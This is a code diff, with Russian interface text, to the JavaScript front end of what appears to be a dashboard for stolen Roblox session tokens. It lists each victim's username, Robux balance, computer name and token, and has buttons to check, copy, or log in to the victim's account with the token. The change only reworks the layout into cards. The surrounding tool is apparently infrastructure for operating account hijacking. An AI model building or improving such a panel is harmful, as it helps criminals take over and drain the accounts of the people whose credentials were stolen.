@@ -9,7 +9,15 @@ let sortMode = 'date';
 
 async function loadTokens() {
   const container = document.getElementById('tokensContainer');
-  container.innerHTML = '<div class="loading">⏳ Загрузка...</div>';
+  const skeletonCard = `
+    <div class="skeleton-card">
+      <div class="skeleton-block" style="width:70px; height:70px; border-radius:50%; margin-top:0.5rem; margin-bottom:1.5rem;"></div>
+      <div class="skeleton-block" style="width:120px; margin-bottom:1.5rem;"></div>
+      <div class="skeleton-block" style="width:100%; height:45px; border-radius:12px; margin-bottom:0.5rem;"></div>
+      <div class="skeleton-block" style="width:100%; height:35px; border-radius:8px; margin-bottom:0.5rem;"></div>
+    </div>
+  `;
+  container.innerHTML = '<div class="tokens-grid">' + skeletonCard + skeletonCard + skeletonCard + skeletonCard + '</div>';
   try {
     const r = await apiFetch('/tokens-data');
     allTokens = await r.json();
@@ -52,44 +60,53 @@ function renderTokens() {
     list.sort((a, b) => new Date(b.uploadedAt || 0) - new Date(a.uploadedAt || 0));
   }
 
-  let html = '<table class="tokens-table" style="border-spacing: 0 8px;"><thead><tr><th>Статус</th><th>Ник</th><th>Robux</th><th>Токен</th><th>Компьютер</th><th>Действия</th></tr></thead><tbody>';
+  let html = '<div class="tokens-grid">';
 
   for (const t of list) {
-    const badgeClass = t.valid ? 'badge-valid' : 'badge-invalid';
-    const statusText = t.valid ? '✅ Рабочий' : '❌ ' + (t.error || 'Невалид');
-    const tokenSnippet = t.security ? escapeHtml(t.security.substring(0, 20)) + '...' : '—';
+    const valid = t.valid;
+    const badgeClass = valid ? 'badge-valid' : 'badge-invalid';
+    const statusText = valid ? '✅' : '❌';
     const tokenFull = escapeHtml(t.security || '');
     const fileId = escapeHtml(t.file || '');
 
-    html += '<tr>';
-    html += '<td style="border-left: 1px solid var(--border); border-top-left-radius: var(--radius-lg); border-bottom-left-radius: var(--radius-lg);"><span class="badge ' + badgeClass + '">' + statusText + '</span></td>';
-    html += '<td><strong>' + escapeHtml(t.username || '—') + '</strong></td>';
+    html += '<div class="token-card">';
+    html += '<div class="token-card-status"><span class="badge ' + badgeClass + '" style="padding: 2px 8px; font-size: 0.75rem;">' + statusText + '</span></div>';
     
-    const rbxText = t.valid && t.robux !== undefined ? t.robux.toLocaleString() + ' R$' : '—';
-    const rbxColor = t.valid && t.robux > 0 ? '#fbbf24' : 'var(--text-muted)';
-    const rbxGlow = t.valid && t.robux > 0 ? 'text-shadow: 0 0 15px rgba(251, 191, 36, 0.5); font-weight: 800;' : 'font-weight: 600;';
-    html += '<td><span style="color: ' + rbxColor + '; ' + rbxGlow + ' font-size: 1.1rem;">' + rbxText + '</span></td>';
-    
-    html += '<td><div class="token-cell">' + tokenSnippet + '</div></td>';
-    html += '<td><div style="font-size: 0.85rem; color: var(--text-secondary);"><span style="margin-right: 5px;">💻</span>' + escapeHtml(t.computer || '—') + '</div></td>';
-    html += '<td style="border-right: 1px solid var(--border); border-top-right-radius: var(--radius-lg); border-bottom-right-radius: var(--radius-lg);"><div style="display:flex; gap:0.5rem; flex-wrap:wrap;">';
-    
-    html += '<button class="copy-btn" onclick="checkSingle(\'' + fileId.replace(/'/g, "\\'") + '\')" style="font-size:0.75rem; padding: 0.4rem 0.8rem; background:rgba(245,158,11,0.1); color:var(--warning); border:1px solid rgba(245,158,11,0.25); border-radius: 6px; transition: all 0.2s;">💰 Проверить</button>';
-    if (t.security) {
-      html += '<button class="copy-btn" onclick="copyText(\'' + tokenFull.replace(/'/g, "\\'") + '\')" style="font-size:0.75rem; padding: 0.4rem 0.8rem; border-radius: 6px; transition: all 0.2s;">📋 Копировать</button>';
-      let loginBtnText = '👤 Войти';
-      const lastLogin = localStorage.getItem('login_' + fileId);
-      if (lastLogin) {
-        const d = new Date(parseInt(lastLogin));
-        loginBtnText = '👤 Заходил ' + d.toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}) + ' ' + d.toLocaleDateString();
-      }
-      html += '<button class="copy-btn" onclick="loginToRoblox(\'' + tokenFull.replace(/'/g, "\\'") + '\', this, \'' + fileId.replace(/'/g, "\\'") + '\')" style="font-size:0.75rem; padding: 0.4rem 0.8rem; background:rgba(16,185,129,0.1); color:var(--success); border:1px solid rgba(16,185,129,0.25); border-radius: 6px; transition: all 0.2s; box-shadow: 0 0 10px rgba(16,185,129,0.1);">' + loginBtnText + '</button>';
+    if (valid && t.robux !== undefined && t.robux > 0) {
+      html += '<div class="token-card-robux">' + t.robux.toLocaleString() + ' R$</div>';
+    } else {
+      html += '<div class="token-card-robux" style="background: rgba(255,255,255,0.05); color: var(--text-muted); border-color: transparent; box-shadow: none;">0 R$</div>';
     }
-    html += '</div></td>';
-    html += '</tr>';
+    
+    html += '<div class="token-card-avatar">👤</div>';
+    html += '<div class="token-card-name">' + escapeHtml(t.username || '—') + '</div>';
+    html += '<div class="token-card-computer">💻 ' + escapeHtml(t.computer || '—') + '</div>';
+    
+    html += '<div class="token-card-actions">';
+    
+    let loginBtnText = 'Войти';
+    let loginClass = 'btn-login';
+    const lastLogin = localStorage.getItem('login_' + fileId);
+    if (lastLogin) {
+      const d = new Date(parseInt(lastLogin));
+      loginBtnText = 'Заходил ' + d.toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}) + ' ' + d.toLocaleDateString();
+      loginClass = 'btn-login logged-in';
+    }
+    
+    if (t.security) {
+      html += '<button class="' + loginClass + '" onclick="loginToRoblox(\'' + tokenFull.replace(/'/g, "\\'") + '\', this, \'' + fileId.replace(/'/g, "\\'") + '\')">' + loginBtnText + '</button>';
+      html += '<div style="display:flex; gap:8px;">';
+      html += '<button class="btn-secondary" style="flex:1; color: var(--warning); border-color: rgba(245,158,11,0.25); background: rgba(245,158,11,0.05);" onclick="checkSingle(\'' + fileId.replace(/'/g, "\\'") + '\')">Проверить</button>';
+      html += '<button class="btn-secondary" style="flex:1;" onclick="copyText(\'' + tokenFull.replace(/'/g, "\\'") + '\')">Копировать</button>';
+      html += '</div>';
+    } else {
+      html += '<button class="btn-secondary" style="width:100%; color: var(--warning); border-color: rgba(245,158,11,0.25); background: rgba(245,158,11,0.05);" onclick="checkSingle(\'' + fileId.replace(/'/g, "\\'") + '\')">Проверить</button>';
+    }
+    
+    html += '</div></div>';
   }
 
-  html += '</tbody></table>';
+  html += '</div>';
   container.innerHTML = html;
 }
 
@@ -169,9 +186,11 @@ function loginToRoblox(token, btn, fileId) {
         if (fileId) {
           localStorage.setItem('login_' + fileId, Date.now());
           const d = new Date();
-          btn.textContent = '👤 Заходил ' + d.toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}) + ' ' + d.toLocaleDateString();
+          btn.textContent = 'Заходил ' + d.toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}) + ' ' + d.toLocaleDateString();
+          btn.className = 'btn-login logged-in';
         } else {
-          btn.textContent = '👤 Войти';
+          btn.textContent = 'Войти';
+          btn.className = 'btn-login';
         }
         btn.disabled = false;
         toast('✅ Вход выполнен, открываем Roblox...');
@@ -186,9 +205,11 @@ function loginToRoblox(token, btn, fileId) {
     const lastLogin = fileId ? localStorage.getItem('login_' + fileId) : null;
     if (lastLogin) {
       const d = new Date(parseInt(lastLogin));
-      btn.textContent = '👤 Заходил ' + d.toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}) + ' ' + d.toLocaleDateString();
+      btn.textContent = 'Заходил ' + d.toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}) + ' ' + d.toLocaleDateString();
+      btn.className = 'btn-login logged-in';
     } else {
-      btn.textContent = '👤 Войти';
+      btn.textContent = 'Войти';
+      btn.className = 'btn-login';
     }
     btn.disabled = false;
   }
